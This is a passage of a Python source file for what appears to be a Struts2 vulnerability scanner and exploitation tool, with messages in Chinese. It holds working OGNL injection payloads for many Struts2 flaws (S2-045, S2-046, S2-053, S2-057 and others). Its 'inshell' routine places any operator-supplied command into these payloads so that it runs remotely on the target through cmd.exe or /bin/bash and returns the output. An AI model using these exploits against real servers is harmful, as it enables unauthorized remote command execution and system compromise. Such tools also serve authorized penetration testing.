        "struts2-053": '''%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo%20%2281dc9bdb52d04dc2%22%26%26FUZZINGCOMMAND%26%26echo%20%220036dbd8313ed055%22%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInputStream%28%29%29%29%7D''',
        "struts2-057-1": '''/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D''',
        "struts2-057-2": '''/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D''',
    }

    def check(self, pocname, vulnstr):
        if vulnstr.find("Active Internet connections") is not -1:
            self.signal[str, str].emit("[+] 目标存在" + pocname + "漏洞..[Linux]", 'red')
        elif vulnstr.find("Active Connections") is not -1:
            self.signal[str, str].emit("[+] 目标存在" + pocname + "漏洞..[Windows]", 'red')
        elif vulnstr.find("活动连接") is not -1:
            self.signal[str, str].emit("[+] 目标存在" + pocname + "漏洞..[Windows]", 'red')
        elif vulnstr.find("LISTEN") is not -1:
            self.signal[str, str].emit("[+] 目标存在" + pocname + "漏洞..[未知OS]", 'red')
        else:
            self.signal[str, str].emit("[-] 目标不存在" + pocname + "漏洞.." , 'green')

    def scan(self):
        self.signal[str, str].emit("[+] 开始检测struts2漏洞", 'green')
        self.signal[str, str].emit("[+] 目标URL:  " + self.url, 'green')
        try:
            req = requests.post(self.url, headers=self.headers, data=self.poc['ST2-005'], timeout=20,
                                verify=False)
            self.check("struts2-005", req.text)
        except:
            print(Fore.YELLOW + '[-] 检测struts2-005超时' + Fore.RESET)
            self.signal[str, str].emit('[-] 检测struts2-005超时', 'green')

        try:
            req = requests.get(self.url + self.poc['ST2-008-1'], headers=self.headers, timeout=20,
                               verify=False)
            self.check("struts2-008-1", req.text)
        except:
            self.signal[str, str].emit('[-] 检测struts2-008-1超时', 'green')
        try:
            req = requests.get(self.url + self.poc['ST2-008-2'], headers=self.headers, timeout=20,
                               verify=False)
            self.check("struts2-008-2", req.text)
        except:
            self.signal[str, str].emit('[-] 检测struts2-008-2超时', 'green')

        try:
            req = requests.post(self.url, headers=self.headers, data=self.poc['ST2-009'], timeout=20,
                                verify=False)
            self.check("struts2-009", req.text)
        except:
            self.signal[str, str].emit('[-] 检测struts2-009超时', 'green')

        try:
            req = requests.post(self.url, headers=self.headers, data=self.poc['ST2-013'], timeout=20,
                                verify=False)
            self.check("struts2-013", req.text)
        except:
            self.signal[str, str].emit('[-] 检测struts2-013超时', 'green')

        try:
            s2_015_url = commurl = urllib.parse.urlparse(self.url)[0]  + '://' + urllib.parse.urlparse(self.url)[1] + '/' + self.poc['ST2-015']
            req = requests.get(url=s2_015_url, timeout=20,verify=False)
            if '15129' in req.text:
                self.signal[str, str].emit('[+] 目标存在struts2-015漏洞', 'red')
        except:
            self.signal[str, str].emit('[-] 检测struts2-015超时', 'green')


        try:
            req = requests.post(self.url, headers=self.headers, data=self.poc['ST2-016'], timeout=20,
                                verify=False)
            self.check("struts2-016", req.text)
        except:
            self.signal[str, str].emit('[-] 检测struts2-016超时', 'green')

        try:
            req = requests.get(self.url + '/?redirect:https://www.baidu.com/%23', timeout=20, verify=False)
            if req.status_code == 302:
                self.signal[str, str].emit("[+] 目标存在struts2-017漏洞..(只提供检测)", 'red')
            else:
                self.signal[str, str].emit("[-] 目标不存在struts2-017漏洞", 'green')
        except:
            self.signal[str, str].emit("[-] 检测struts2-017超时", 'green')

        try:
            req = requests.post(self.url, headers=self.headers, data=self.poc['ST2-019'], timeout=20,
                                verify=False)
            self.check("struts2-019", req.text)
        except:
            self.signal[str, str].emit("[-] 检测struts2-019超时", 'green')

        try:
            req = requests.get(self.url + self.poc['ST2-devmode'], headers=self.headers, timeout=20,
                               verify=False)
            self.check("struts2-devmode", req.text)
        except:
            self.signal[str, str].emit("[-] 检测struts2-devmode超时", 'green')

        try:
            req = requests.get(self.url + self.poc['ST2-032'], headers=self.headers, timeout=20,
                               verify=False)
            self.check("struts2-032", req.text)
        except:
            self.signal[str, str].emit("[-] 检测struts2-032超时超时", 'green')

        try:
            req = requests.get(self.url + self.poc['ST2-033'], headers=self.headers, timeout=20,
                               verify=False)
            self.check("struts2-033", req.text)
        except:
            self.signal[str, str].emit("[-] 检测struts2-033超时", 'green')

        try:
            req = requests.get(self.url + self.poc['ST2-037'], headers=self.headers, timeout=20,
                               verify=False)
            self.check("struts2-037", req.text)
        except:
            self.signal[str, str].emit("[-] 检测struts2-037超时", 'green')

        try:
            req = requests.get(self.url, headers=self.headers2, timeout=20, verify=False)
            self.check("struts2-045-1", req.text)
        except:
            self.signal[str, str].emit("[-] 检测struts2-045-1超时", 'green')

        try:
            headers045 = {
                'Content-Type': '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("testvuln",1234*1234)}.multipart/form-data',
            }
            req = requests.get(self.url, headers=headers045, timeout=20, verify=False)
            try:
                if r"1522756" in req.headers['testvuln']:
                    self.signal[str, str].emit("[+] 目标存在struts2-045-2漏洞", 'red')
            except:
                pass
        except:
            self.signal[str, str].emit("[-] 检测struts2-045-2超时", 'green')
        try:
            uploadexp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x000"
            files = {"test": (uploadexp, "text/plain")}
            req = requests.post(self.url, files=files, timeout=20, verify=False)
            self.check("struts2-046", req.text)
        except:
            self.signal[str, str].emit("[-] 检测struts2-046超时", 'green')

        try:
            vulnurl = urllib.parse.urlparse(self.url)[0] + "://" + \
                      urllib.parse.urlparse(self.url)[
                          1] + "/struts2-showcase/integration/saveGangster.action"
            postdata = {
                "name": self.poc['ST2-048'],
                "age": "1",
                "__checkbox_bustedBefore": "true",
                "description": "1",
            }
            req = requests.post(vulnurl, data=postdata, headers=self.headers, timeout=20, verify=False)
            self.check("struts2-048", req.text)
        except:
            self.signal[str, str].emit("[-] 检测struts2-048超时", 'green')

        try:
            req1 = requests.get(self.url + "?class[%27classLoader%27][%27jarPath%27]=1",
                                headers=self.headers, timeout=20,
                                verify=False)
            req2 = requests.get(self.url + "?class[%27classLoader%27][%27resources%27]=1",
                                headers=self.headers,
                                timeout=20, verify=False)
            if req1.status_code == 200 and req2.status_code == 404:
                self.signal[str, str].emit("[+] 目标存在struts2-020漏洞..(只提供检测)", 'red')
            else:
                self.signal[str, str].emit("[-] 目标不存在struts2-020漏洞", 'green')
        except Exception as e:
            print(Fore.YELLOW + "[-] 检测struts2-020超时.." + Fore.RESET)
            self.signal[str, str].emit("[-] 检测struts2-020超时", 'green')

        try:
            req = requests.post(self.url, data=self.poc['ST2-052'], headers=self.headers_052, timeout=20,
                                verify=False)
            if req.status_code == 500 and r"java.security.Provider$Service" in req.text:
                self.signal[str, str].emit("[+] 目标存在struts2-052漏洞..(参考metasploit中的struts2_rest_xstream模块)", 'red')
            else:
                self.signal[str, str].emit("[-] 目标不存在struts2-052漏洞", 'green')
        except Exception as e:
            self.signal[str, str].emit("[-] 检测struts2-052超时", 'green')

        try:
            params = [
                "id",
                "name",
                "filename",
                "username",
                "password",
            ]
            for param in params:
                vulnurl = self.url + "?" + param + "=" + self.poc['ST2-053']
                self.signal[str, str].emit("[-] 正在检测struts2-053 参数:" + param, 'green')
                req = requests.get(vulnurl, headers=self.headers, timeout=20, verify=False)
                self.check("struts2-053", req.text)
        except Exception as e:
            self.signal[str, str].emit("[-] 检测struts2-053超时", 'green')

        try:
            surl = self.url[self.url.rfind('/')::]
            rurl = self.url.replace(surl, "") + self.poc["struts2-057-1"] + surl
            req = requests.get(rurl, timeout=20, verify=False, allow_redirects=True)
            self.check("struts2-057-1", req.text)
        except Exception as e:
            self.signal[str, str].emit("[-] 检测struts2-057-1超时", 'green')

        try:
            surl = self.url[self.url.rfind('/')::]
            rurl = self.url.replace(surl, "") + self.poc["struts2-057-2"] + surl
            req = requests.get(rurl, timeout=20, verify=False, allow_redirects=True)
            self.check("struts2-057-2", req.text)
        except Exception as e:
            self.signal[str, str].emit("[-] 检测struts2-057-2超时", 'green')

    def inshell(self, pocname, cmd:str):
        if pocname == "struts2-005":
            commurl = self.url
            try:
                req = requests.post(commurl, data=self.shell['struts2-005'].replace("FUZZINGCOMMAND", cmd),
                                                headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-008-1":
            commurl = self.url
            try:
                req = requests.get(commurl + self.shell['struts2-008-1'].replace("FUZZINGCOMMAND", cmd),
                                           headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-008-2":
            try:
                commurl = self.url
                req = requests.get(commurl + self.shell['struts2-008-2'].replace("FUZZINGCOMMAND", cmd),
                                           headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-009":
            try:
                commurl = self.url
                req = requests.post(commurl, data=self.shell['struts2-009'].replace("FUZZINGCOMMAND", cmd),
                                            headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-013":
            try:
                commurl = self.url
                req = requests.post(commurl, data=self.shell['struts2-013'].replace("FUZZINGCOMMAND", cmd),
                                            headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-015":
            try:
                commurl = urllib.parse.urlparse(self.url)[0]  + '://' + urllib.parse.urlparse(self.url)[1] + '/' + self.shell['struts2-015'].replace('FUZZINGCOMMAND',cmd)
                req = requests.get(url=commurl)
                self.signal[str, str].emit(req.text, 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-016":
            try:
                commurl = self.url
                req = requests.post(url=commurl,
                                            data=self.shell['struts2-016'].replace("FUZZINGCOMMAND", cmd),
                                            headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-019":
            try:
                cmd = re.sub(r"\s{2,}", " ", cmd).replace(" ", "','")
                req = requests.post(self.url,
                                            data=self.shell['struts2-019'].replace("FUZZINGCOMMAND", cmd),
                                            headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-devmode":
            try:
                commurl = self.url + self.shell['struts2-devmode'].replace("FUZZINGCOMMAND",
                                                                                                cmd)
                req = requests.get(commurl, headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-032":
            try:
                commurl = self.url + self.shell['struts2-032'].replace("FUZZINGCOMMAND", cmd)
                req = requests.get(commurl, headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-033":
            try:
                commurl = self.url + self.shell['struts2-033'].replace("FUZZINGCOMMAND", cmd)
                req = requests.get(commurl, headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-037":
            try:
                commurl = self.url + self.shell['struts2-037'].replace("FUZZINGCOMMAND", cmd)
                req = requests.get(commurl, headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-045-1":
            headers_exp = {
                        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
                        "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                    }
            try:
                req = requests.get(self.url, headers=headers_exp, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-045-2":
            headers_exp = {
                'Content-Type': '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("testvuln",' + cmd +')}.multipart/form-data',
            }
            try:
                req = requests.get(self.url, headers=headers_exp, timeout=20, verify=False)
                self.signal[str, str].emit(req.headers['testvuln'].replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-046":
            try:
                uploadexp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x000"
                files = {"test": (uploadexp, "text/plain")}
                req = requests.post(self.url, files=files, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-048":
            try:
                vulnurl = urllib.parse.urlparse(self.url)[0] + "://" + \
                                  urllib.parse.urlparse(self.url)[
                                      1] + "/struts2-showcase/integration/saveGangster.action"
                postdata = {
                            "name": self.shell['struts2-048'].replace("FUZZINGCOMMAND", cmd),
                            "age": "1",
                            "__checkbox_bustedBefore": "true",
                            "description": "1",
                        }
                req = requests.post(vulnurl, data=postdata, headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        # if pocname == "struts2-053":
        #     param = input("请指定struts2-053参数: ")
        #     while True:
        #
        #         command = input(prompt)
        #         command = command.strip()
        #         if command != "exit":
        #             try:
        #                 vulnurl = self.url + "?" + param + "=" + self.shell['struts2-053'].replace(
        #                     "FUZZINGCOMMAND",
        #                     command)
        #                 req = requests.get(vulnurl, headers=self.headers, timeout=20, verify=False)
        #                 pattern = r'81dc9bdb52d04dc2([\s\S]*)0036dbd8313ed055'
        #                 m = re.search(pattern, req.text)
        #                 if m:
        #                     print(m.group(1).strip())
        #                 print("\n")
        #             except:
        #                 print(Fore.YELLOW + "[-] 命令执行失败!!!" + Fore.RESET)
        #         else:
        #             break

        if pocname == "struts2-057-1":
            try:
                surl = self.url[self.url.rfind('/')::]
                rurl = self.url.replace(surl, "") + self.shell["struts2-057-1"].replace(
                            "FUZZINGCOMMAND",
                            cmd) + surl
                req = requests.get(rurl, headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

        if pocname == "struts2-057-2":
            try:
                surl = self.url[self.url.rfind('/')::]
                rurl = self.url.replace(surl, "") + self.shell["struts2-057-2"].replace(
                            "FUZZINGCOMMAND",
                            cmd) + surl
                req = requests.get(rurl, headers=self.headers, timeout=20, verify=False)
                self.signal[str, str].emit(req.text.replace('\n','<br>'), 'green')
            except:
                self.signal[str, str].emit("[-] 命令执行失败!!!", 'red')

    def run(self):
        if self.cookie != '/':
            self.headers['cookie'] = self.cookie
            self.headers2['cookie'] = self.cookie
            self.headers_052['cookie'] = self.cookie
        else:
            pass
        if self.activity == 'scan':
            self.scan()
        elif self.activity == 'exe_cmd':
            self.inshell(self.selection_bug,self.cmd)